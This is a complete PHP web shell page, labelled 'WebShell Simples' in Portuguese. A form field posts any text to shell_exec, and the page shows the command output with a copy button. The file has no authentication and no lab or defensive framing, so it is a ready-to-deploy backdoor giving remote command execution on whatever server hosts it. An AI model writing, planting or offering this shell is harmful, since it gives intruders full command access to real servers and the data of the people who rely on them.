<?php
if (!empty($_POST['cmd'])) {
  $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="/css/icone.ico" rel="icon" type="image/x-icon">
  <link href="/css/estilo.css" rel="stylesheet" type="text/css">
  <title>WSH</title>
</head>

<body>
  <main>
    <h1>+ WebShell Simples</h1>
    <h3>Utilize o campo para executar um comando:</h3><br>
    <form method="post">
      <h2><strong>&gt; Comando:</strong></h2>
      <div class="form-group">
        <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
          onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
        <button type="submit">Executar</button>
      </div>
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
      <h2>&lt; Output</h2>
      <?php if (isset($cmd)): ?>
        <pre id="output"><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
        <button id="copy-button" class="copy">Copiar para o clipboard</button>
      <?php else: ?>
        <pre>Sem Resultados...</pre>
      <?php endif; ?>
    <?php endif; ?>
  </main>
  <script> <!-- Função botão de copiar para clipboard-->
    const copyButton = document.getElementById('copy-button');
    const output = document.getElementById('output');

    copyButton.addEventListener('click', () => {
      navigator.clipboard.writeText(output.innerText);
        copyButton.innerHTML = "Copiado!";
        setTimeout(() => {
          copyButton.innerHTML = "Copiar para o clipboard";
        }, 2000); // Tempo até o botão voltar ao normal
    });
  </script>
</body>
</html>
